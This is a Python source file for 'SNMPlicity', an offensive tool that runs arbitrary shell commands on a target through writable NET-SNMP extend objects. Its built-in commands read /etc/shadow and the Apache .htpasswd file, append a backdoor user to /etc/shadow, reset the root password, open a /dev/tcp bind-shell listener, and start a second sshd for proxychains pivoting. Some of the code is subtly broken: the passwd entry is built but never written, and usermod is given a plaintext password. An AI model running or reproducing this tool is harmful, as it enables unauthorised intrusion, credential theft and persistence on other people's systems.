#!/usr/bin/env python3

import os
import sys
import cmd
import time
import json
import random
import base64
import socket 
import colorama
import argparse


_AUTHOR_ = "tisf"
__APP_NAME__ = "SNMPlicity"
__VERSION__ = "0.1"

_BANNER_ = f"""
 {colorama.Fore.RED}_____ _____ _____ _____ {colorama.Fore.GREEN} _ _     _ _   {colorama.Style.RESET_ALL} 
 {colorama.Fore.RED}|   __|   | |     |  _  {colorama.Fore.GREEN}| |_|___|_| |_ _ _ {colorama.Style.RESET_ALL} 
 {colorama.Fore.RED}|__   | | | | | | |   __{colorama.Fore.GREEN}| | |  _| |  _| | |{colorama.Style.RESET_ALL} 
 {colorama.Fore.RED}|_____|_|___|_|_|_|__|  {colorama.Fore.GREEN}|_|_|___|_|_| |_  |{colorama.Style.RESET_ALL} 
 {colorama.Fore.RED}                             {colorama.Fore.GREEN}        |___|{colorama.Style.RESET_ALL} 
                                                version {__VERSION__}, by {_AUTHOR_}
"""
                                           
# Globals // Constants
DEF_LISTENER_PORT   = 4545
LISTENER            = "while true; do { read line <&3; echo \"$line\" | /bin/sh 2>&1 >&3; } 3<>/dev/tcp/0.0.0.0/" + str(DEF_LISTENER_PORT) + "; done"
BASE_INFO           = ['pwd', 'whoami', 'hostname']
LOG_DIR             = f"{os.path.dirname(os.path.realpath(__file__))}/logs"


# Global variables
current_dir         = "?"
current_user        = "?"
current_hostname    = "?"


# Setup Argparse
argparser = argparse.ArgumentParser(description=f"{_BANNER_}\n{__APP_NAME__} by {_AUTHOR_}")
argparser.add_argument('-c', '--community-string', help='SNMP community string', required=True)
argparser.add_argument('-t', '--target', help='Target IP address', required=True)
argparser.add_argument('-p', '--port', help='Target port', default=161)
argparser.add_argument('--binary', help='Binary to use for command execution', default='/bin/busybox')
args = argparser.parse_args()


# Create logs directory
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)


# Create log file
epoch_now = int(time.time())
date_time = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime(epoch_now))
LOG_FILE = f"{LOG_DIR}/{args.target}_{epoch_now}.log"
F = open(LOG_FILE, "w")
F.write(f"REDWALKER log file for {args.target}\n")
F.write(f'\tCommunity string: {args.community_string}\n')
F.write(f'\tPort: {args.port}\n')
F.write(f'\tBinary: {args.binary}\n')
F.write(f'\tTime: {date_time}\n')
F.write(f'{"-"*50}\n')
F.flush()



def get_info_file_name(target_ip):
    sanitized_ip = target_ip.replace(".", "_")  # Replace dots with underscores to ensure filename is valid
    return f"{LOG_DIR}/{sanitized_ip}_basic_info.json"


def save_basic_info(target_ip, dir, user, hostname):
    info_file = get_info_file_name(target_ip)
    info = {
        'current_dir': dir,
        'current_user': user,
        'current_hostname': hostname
    }
    with open(info_file, 'w') as f:
        json.dump(info, f)


def load_basic_info(target_ip):
    global current_dir, current_user, current_hostname
    info_file = get_info_file_name(target_ip)
    with open(info_file, 'r') as f:
        info = json.load(f)
        current_dir = info.get('current_dir', '?')
        current_user = info.get('current_user', '?')
        current_hostname = info.get('current_hostname', '?')


def collect_basic_info(target_ip):
    global current_dir, current_user, current_hostname
    info_file = get_info_file_name(target_ip)
    # Check if the file for the specific target exists and has data
    if os.path.exists(info_file):
        try:
            load_basic_info(target_ip)
            return
        except Exception as e:
            print(f"Error loading information from file for target {target_ip}: {e}")
            # If there's an error reading the file, collect the information again
    # Collect and save the basic information if not loaded from file
    current_dir = "?"
    current_user = "redwalker"
    current_hostname = args.target
    save_basic_info(target_ip, current_dir, current_user, current_hostname)


# This function checks if the required binaries are available
def confirm_binaries_exist():
    '''
    This function checks if the required binaries are available
    :return: None
    '''
    bins = ['snmpset', 'snmpwalk', 'openssl']
    for bin in bins:
        if not os.path.exists(f'/usr/bin/{bin}'):
            print(f'{colorama.Fore.RED}[-]{colorama.Style.RESET_ALL} {bin} not found in /usr/bin. Exiting...')
            sys.exit(1)

# This function parses the output of the snmpwalk command
def parse_output(output):
    '''
    This function parses the output of the snmpwalk command
    :param output: The output of the snmpwalk command - raw
    :return: The parsed output
    '''

    global current_dir, current_user, current_hostname


    # Split the output into lines
    lines = output.split('\n')
    # Initialize a dictionary to hold the lines associated with nsCommandNotif
    command_notif_lines = {}

    # Try to grab each one of the BASE_INFO from raw output
    for i in BASE_INFO:
        if f'NET-SNMP-EXTEND-MIB::nsExtendOutLine."base_{i}"' in output:
            for line in lines:
                if f'NET-SNMP-EXTEND-MIB::nsExtendOutLine."base_{i}"' in line:
                    parts = line.split(' = STRING: ')
                    content = parts[1] if len(parts) > 1 else ""
                    # print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} {i}: {content}")
                    if i == 'pwd':
                        current_dir = content
                    elif i == 'whoami':
                        current_user = content
                    elif i == 'hostname':
                        current_hostname = content
        save_basic_info(args.target, current_dir, current_user, current_hostname)

    # Iterate through each line, looking for ones that contain nsExtendOutLine."nsCommandNotif"
    for line in lines:
        if 'NET-SNMP-EXTEND-MIB::nsExtendOutLine."nsCommandNotif"' in line:
            # Extract the index and the content
            parts = line.split(' = STRING: ')
            index = int(parts[0].split('.')[-1])  # Get the numeric part of the index
            content = parts[1] if len(parts) > 1 else ""
            # Store this in the dictionary
            command_notif_lines[index] = content

    # Check if we found any relevant lines
    if not command_notif_lines:
        return "No nsCommandNotif output found."

    # Extract and sort the indexes
    sorted_indexes = sorted(command_notif_lines.keys())

    # Compile the output from the highest index
    highest_index = sorted_indexes[-1]  # Get the highest index
    output_lines = []
    for idx in range(highest_index, 0, -1):  # Go backwards from highest index to 1
        if idx in command_notif_lines:  # This checks if there is a line for this index
            output_lines.append(command_notif_lines[idx])

    # Join the extracted lines into a single string, if there are any, otherwise return None
    final_output = '\n'.join(output_lines)

    if not final_output:
        return "No nsCommandNotif output found."

    return final_output

# This function runs a command on the target
def run_command(
        command : str,
        binary : str = args.binary
        ):
    '''
    This function runs a command on the target using SNMP
    :param command: The command to run
    :param binary: The binary to use for command execution
    :return: True if the command was executed successfully, False otherwise
    '''

    global current_dir, current_user, current_hostname

    """
    caps = Capsulation()
    command = caps.encapsulate(command.strip())
    command = command.replace('\"', '\\"')
    """

    rand_4_chars = 'nsCommandNotif' 

    cmd = f"snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c {args.community_string} {args.target} "
    cmd += f'\'nsExtendStatus.\"{rand_4_chars}\"\' = createAndGo '
    cmd += f'\'nsExtendCommand.\"{rand_4_chars}\"\' = {binary} '
    cmd += f'\'nsExtendArgs.\"{rand_4_chars}\"\' = "{command}" '

    # Execute the command amd get the output
    output = os.popen(cmd).read()

    if "NET-SNMP-EXTEND-MIB::nsExtendStatus" in output:
        print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} Command executed successfully")
    else:
        print(f"{colorama.Fore.RED}[-]{colorama.Style.RESET_ALL} Command failed to execute")
        print(output)
        return False
    
    # Do Headers
    if current_dir == "?" or current_dir == "":
        for i in BASE_INFO:
            cmd = f"snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c {args.community_string} {args.target} "
            cmd += f'\'nsExtendStatus.\"base_{i}\"\' = createAndGo '
            cmd += f'\'nsExtendCommand.\"base_{i}\"\' = {binary} '
            cmd += f'\'nsExtendArgs.\"base_{i}\"\' = "{i}" '
            os.popen(cmd).read()

    print(f'{colorama.Fore.BLUE}[ ]{colorama.Style.RESET_ALL} Collecting output...')

    # Get the output
    cmd = f'snmpwalk -v2c -c {args.community_string} {args.target} NET-SNMP-EXTEND-MIB::nsExtendObjects'
    # run the command and grab the output
    output = os.popen(cmd).read()
    output = parse_output(output)
    print(output)
    time_now = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(time.time())))
    F.write(f"# ({time_now}) {command}\n{output}\n")
    F.flush()

    # null the snmp object
    cmd = f"snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c {args.community_string} {args.target} "
    cmd += f'\'nsExtendStatus.\"{rand_4_chars}\"\' = destroy '
    os.popen(cmd).read()

    # null the headers
    for i in BASE_INFO:
        cmd = f"snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c {args.community_string} {args.target} "
        cmd += f'\'nsExtendStatus.\"base_{i}\"\' = destroy '
        os.popen(cmd).read()

    return True

# This function checks if a port is open
def is_port_open(
        ip: str, 
        port: int, 
        timeout: int = 2
        ):
    '''
    This function checks if a port is open
    :param ip: The IP address
    :param port: The port
    :param timeout: The timeout
    :return: True if the port is open, False otherwise
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False


def main():
    
    def _build_prompt():
        banner = ""
        if current_user != "?" and current_user != "":
            banner += f"{colorama.Fore.GREEN}{current_user}{colorama.Style.RESET_ALL}@"
        else:
            banner += f"{colorama.Fore.RED}{__APP_NAME__}{colorama.Style.RESET_ALL}@"

        if current_hostname != "?" and current_hostname != "":
            banner += f"{colorama.Fore.RED}{current_hostname}{colorama.Style.RESET_ALL} "
        else:
            banner += f"{args.target} "

        if current_dir != "?" and current_dir != "":
            banner += f":{colorama.Fore.RED}{current_dir}{colorama.Style.RESET_ALL}"
        else:
            banner += ":/ "
        banner += "> "
        return banner
    
    collect_basic_info(args.target)
    confirm_binaries_exist()
    print(_BANNER_)

    history = []

    try:
        while True:

            command = input(_build_prompt())

            if command == 'exit':
                sys.exit(0)

            elif command == 'help':
                print(f"""
                {colorama.Fore.GREEN}Commands{colorama.Style.RESET_ALL}
                {colorama.Fore.GREEN}--------{colorama.Style.RESET_ALL}
                {colorama.Fore.GREEN}exit{colorama.Style.RESET_ALL} - Exit the program
                {colorama.Fore.GREEN}help{colorama.Style.RESET_ALL} - Display this help menu
                {colorama.Fore.GREEN}apache_creds{colorama.Style.RESET_ALL} - Attempt to get Apache credentials
                {colorama.Fore.GREEN}make_user_system{colorama.Style.RESET_ALL} - Create a new system user with a random username and password
                {colorama.Fore.GREEN}make_user_apache{colorama.Style.RESET_ALL} - Create a new apache user with a random username and password
                {colorama.Fore.GREEN}get_shadow{colorama.Style.RESET_ALL} - Attempt to get the /etc/shadow file
                {colorama.Fore.GREEN}new_ssh_server <port>{colorama.Style.RESET_ALL} - Start a new SSH server on a different port
                {colorama.Fore.GREEN}list_busybox{colorama.Style.RESET_ALL} - List all available commands in busybox
                {colorama.Fore.GREEN}change_root_password{colorama.Style.RESET_ALL} - Change the root password
                {colorama.Fore.GREEN}listener{colorama.Style.RESET_ALL} - Open a listener on port {DEF_LISTENER_PORT}
                """)

            elif command.strip().startswith('listener'):
                if " " in command:
                    port = command.split(' ')[1]
                    if port.isdigit():
                        run_command(LISTENER.replace(str(DEF_LISTENER_PORT), port))
                        if is_port_open(args.target, int(port)):
                            print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} Should have a listener started on port {port}")
                            print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} Use the following command to connect: nc {args.target} {port}")
                        else:
                            print(f"{colorama.Fore.RED}[-]{colorama.Style.RESET_ALL} Failed to start listener on port {port}. Command worked but port is not open.")
                            
                    else:
                        print(f"{colorama.Fore.RED}[-]{colorama.Style.RESET_ALL} Invalid port")
                else:
                    run_command(LISTENER)
                    if is_port_open(args.target, DEF_LISTENER_PORT):
                        print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} Should have a listener started on port {DEF_LISTENER_PORT}")
                        print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} Use the following command to connect: nc {args.target} {DEF_LISTENER_PORT}")
                    else:
                        print(f"{colorama.Fore.RED}[-]{colorama.Style.RESET_ALL} Failed to start listener on port {DEF_LISTENER_PORT}. Command worked but port is not open.")

            elif command.strip().startswith('apache_creds'):
                run_command('cat /etc/apache2/.htpasswd')

            elif command.strip().startswith('make_user_system'):
                username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))
                password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))
                print(f"{colorama.Fore.BLUE}[ ]{colorama.Style.RESET_ALL} Creating user {username} with password {password}")
                hashed_pass = os.popen(f'openssl passwd -1 {password}').read().strip()
                random_uid = random.randint(1000, 9999)
                line_to_etc_passwd = f"{username}:{hashed_pass}:{random_uid}:{random_uid}::/root:/bin/bash"
                line_to_etc_shadow = f"{username}:{hashed_pass}:18474:0:99999:7:::"
                run_command(f'echo "{line_to_etc_shadow}" >> /etc/shadow')

            elif command.strip().startswith('change_root_password'):
                password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))
                print(f"{colorama.Fore.BLUE}[ ]{colorama.Style.RESET_ALL} Changing root password to {password}")
                run_command(f'usermod --password {password} root')

            elif command.strip().startswith('get_shadow'):
                run_command('cat /etc/shadow')

            elif command.strip().startswith('list_busybox'):
                run_command('busybox --list')

            elif command.strip().startswith('new_ssh_server'):
                # Run another instance of sshd on a different port
                try:
                    port = command.split(' ')[1]
                except:
                    port = str(DEF_LISTENER_PORT)
                    print(f"{colorama.Fore.BLUE}[ ]{colorama.Style.RESET_ALL} No port specified. Using default port {DEF_LISTENER_PORT}")
                
                if port.isdigit():
                    run_command(f'sshd -p {port}')

                    if is_port_open(args.target, int(port)):
                        print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} Should have an SSH server started on port {port}")
                        print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} Use the following command to connect: ssh -D 4545 -C user@{args.target} -p {port}")
                        print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} Then use proxychains/SOCKS5 to connect.")
                        print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} \tAdd to /etc/proxychains4.conf the line: 'socks5 127.0.0.1 {port}'")
                        print(f"{colorama.Fore.GREEN}[+]{colorama.Style.RESET_ALL} \tOr nmap like: proxychains nmap -sT -sV -p- --script=vuln {args.target} -Pn")
                    else:
                        print(f"{colorama.Fore.RED}[-]{colorama.Style.RESET_ALL} Failed to start SSH server on port {port}. Command worked but port is not open.")
                else:
                    print(f"{colorama.Fore.RED}[-]{colorama.Style.RESET_ALL} Invalid port")

            elif command.strip().startswith('make_user_apache'):
                username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))
                password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))
                print(f"{colorama.Fore.BLUE}[ ]{colorama.Style.RESET_ALL} Creating user {username} with password {password}")
                run_command(f'htpasswd -b /etc/apache2/.htpasswd {username} {password}')

            elif command.strip() == "":
                pass

            else:
                run_command(command)
  
    except KeyboardInterrupt:
        print(f"\n{colorama.Fore.RED}[-]{colorama.Style.RESET_ALL} Exiting...")
        sys.exit(0)


if __name__ == "__main__":
    main()









